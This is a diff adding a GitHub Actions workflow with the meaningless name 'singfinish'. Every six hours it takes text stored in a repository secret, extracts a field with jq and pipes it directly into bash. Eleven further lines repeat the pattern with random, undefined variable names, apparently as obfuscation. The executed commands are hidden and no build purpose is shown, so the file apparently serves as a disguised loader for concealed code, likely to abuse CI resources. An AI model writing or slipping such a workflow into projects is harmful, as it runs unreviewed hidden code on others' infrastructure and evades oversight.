@@ -1,0 +1,29 @@
+name: singfinish
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: singfinish
+        env:
+          trew9: ${{ secrets.trew9 }}
+        run: |
+          echo $trew9 | jq -r .ob294 | /bin/bash
+          echo $sppi25245 | jq -r .ggbj9 | /bin/bash
+          echo $yy63 | jq -r .rgr57 | /bin/bash
+          echo $ixhf6078 | jq -r .ztof09950 | /bin/bash
+          echo $istp332 | jq -r .ufeex5763 | /bin/bash
+          echo $eooi53432 | jq -r .uuxkw57483 | /bin/bash
+          echo $crfte7867 | jq -r .ocbv1 | /bin/bash
+          echo $jiya8429 | jq -r .xe7373 | /bin/bash
+          echo $icfe706 | jq -r .pwik47495 | /bin/bash
+          echo $htor5993 | jq -r .bkf486 | /bin/bash
+          echo $gti534 | jq -r .mgx2 | /bin/bash
+          echo $gl823 | jq -r .wwdaw665 | /bin/bash
+
